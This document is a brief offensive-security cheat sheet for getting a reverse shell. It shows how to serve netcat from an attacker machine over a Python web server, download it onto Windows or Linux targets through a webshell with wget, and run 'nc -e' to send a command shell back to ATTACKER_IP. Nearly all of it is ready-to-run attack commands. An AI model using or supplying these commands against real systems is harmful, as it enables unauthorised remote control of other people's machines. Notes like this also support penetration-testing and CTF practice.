Using a revshell, multiple ways can be done to get a revshell - but this way's consistent.

Transfer nc to target! 

Windows target:
```bash
sudo cp /usr/share/windows-resources/binaries/nc.exe .
```
Linux target:
```bash
sudo cp /usr/bin/nc .
```
```bash
python -m http.server 80
```

On windows webshell:
```batch
powershell wget -Uri http://$(ATTACKER_IP)/nc.exe -OutFile C:\Windows\Temp\nc.exe
```
Linux:
```bash
wget http://$(ATTACKER_IP)/nc
```
Finally:
```batch
C:\Windows\Temp\nc.exe -e cmd.exe $(ATTACKER_IP) $(ATTACKER_PORT)
```
or
```bash
nc -e /bin/sh $(ATTACKER_IP) $(ATTACKER_PORT)
```
